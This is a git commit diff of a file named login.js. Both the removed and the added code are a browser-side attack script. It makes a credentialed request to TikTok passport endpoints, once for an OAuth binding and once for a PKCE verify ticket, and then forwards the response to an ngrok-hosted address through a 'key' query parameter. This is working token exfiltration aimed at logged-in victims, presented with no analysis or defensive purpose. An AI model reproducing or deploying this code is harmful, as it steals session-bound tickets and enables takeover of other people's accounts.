2eccdc3ce0a560f622d3face69779f54a231788b
cancerz1990 <94399415+cancerz1990@users.noreply.github.com>
2023-08-31 03:20:47 +0700

    Update login.js

--- login.js
+++ login.js
@@ -1,12 +1,11 @@
-var req = new XMLHttpRequest();
-req.onload = reqListener;
-req.open('POST','https://ads.tiktok.com/passport/web/shark/safe_verify/?msToken=or6IAX2oBn8DiZB3AnCIeMAsJoeVSdb5TsIH7rHyFtYUl6Q4XwdvxpkmvqRbpUPfC29MiWfYR2v5RAFkkTxbhUoqb-__trxRjq2aw8mQ6sfypZkHddXtL_gIrSRYylxl6A8oyyMndkUMH8-3_A==&X-Bogus=DFSzsIVLZC0tgY/HtxxIuUWdbTo7&_signature=_02B4Z6wo00001b4nHjwAAIDBlF7mqG44QVW-JhqAAAth27',true);
-req.withCredentials = true;
-req.setRequestHeader('Content-Type', 'application/json',true);
-req.setRequestHeader('Referer', 'https://ads.tiktok.com',true);
-req.send('aid=1583&service=&language=en&target=bind_oauth',true);
+var xhr = new XMLHttpRequest();
+
+xhr.onload = reqListener; 
+xhr.open("GET", "https://effecthouse.tiktok.com/passport/web/gen_pkce_verify_ticket/?aid=1459&code_challenge=472c93bxxxxxxxxxxxxxxxxf&language=en");
+xhr.withCredentials = true;
+xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+xhr.send();
 
 function reqListener() {
-location='//2d7a-140-213-103-229.ngrok-free.app/log?key='+this.responseText;
-	};
-}
+    location='//2d7a-140-213-103-229.ngrok-free.app/?key='+this.responseText; 
+};
